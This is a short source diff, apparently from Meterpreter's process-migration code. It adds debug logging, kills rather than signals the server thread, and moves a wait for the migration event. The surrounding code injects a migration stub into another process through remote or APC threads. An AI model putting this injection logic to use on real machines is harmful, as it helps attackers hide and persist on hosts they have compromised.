@@ -553,14 +553,17 @@ DWORD migrate_via_remotethread( Remote * remote, Packet * response, HANDLE hProc
 			}
 		}
 
+		dprintf("[MIGRATE] Sending a migrate response..." );
 		// Send a successful response to let the ruby side know that we've pretty
 		// much successfully migrated and have reached the point of no return
 		packet_add_tlv_uint( response, TLV_TYPE_MIGRATE_TECHNIQUE, dwTechnique );
 		packet_transmit_response( ERROR_SUCCESS, remote, response );
 
+		dprintf("[MIGRATE] Sleeping for two seconds..." );
 		// Sleep to give the remote side a chance to catch up...
 		Sleep( 2000 );
 
+		dprintf("[MIGRATE] Resuming the migration thread..." );
 		// Resume the migration thread...
 		if( ResumeThread( hThread ) == (DWORD)-1 )
 			BREAK_ON_ERROR( "[MIGRATE] migrate_via_remotethread: ResumeThread failed" )
@@ -650,6 +653,8 @@ DWORD remote_request_core_migrate( Remote * remote, Packet * packet )
 		if( !DuplicateHandle( GetCurrentProcess(), hEvent, hProcess, &ctx.e.hEvent, 0, TRUE, DUPLICATE_SAME_ACCESS ) )
 			BREAK_ON_ERROR( "[MIGRATE] DuplicateHandle failed" )
 
+		dprintf("EventHandle is %d (local) and %d (remote)", hEvent, ctx.e.hEvent);
+
 		// Get the architecture specific process migration stub...
 		if( dwDestinationArch == PROCESS_ARCH_X86 )
 		{
@@ -697,14 +702,18 @@ DWORD remote_request_core_migrate( Remote * remote, Packet * packet )
 				BREAK_ON_ERROR( "[MIGRATE] migrate_via_apcthread failed" )
 		}
 
-		// Wait at most 15 seconds for the event to be set letting us know that it's finished
-		if( WaitForSingleObjectEx( hEvent, 15000, FALSE ) != WAIT_OBJECT_0 )
-			BREAK_ON_ERROR( "[MIGRATE] WaitForSingleObjectEx failed" )
 
 		// Signal the main server thread to begin the shutdown as migration has been successfull.
+		// If the thread is not killed, the pending packet_receive prevents the new process
+		// from being able to negotiate SSL.
 		dprintf("[MIGRATE] Shutting down the Meterpreter thread 1 (signaling main thread)...");
-		
-		thread_sigterm( serverThread );
+		thread_kill( serverThread );
+
+		// Wait at most 15 seconds for the event to be set letting us know that it's finished
+		// Unfortunately, its too late to do anything about a failure at this point
+		if( WaitForSingleObjectEx( hEvent, 15000, FALSE ) != WAIT_OBJECT_0 )
+			dprintf("[MIGRATE] WaitForSingleObjectEx failed with no way to recover");
+			// BREAK_ON_ERROR( "[MIGRATE] WaitForSingleObjectEx failed" )
 
 		dwResult = ERROR_SUCCESS;
 
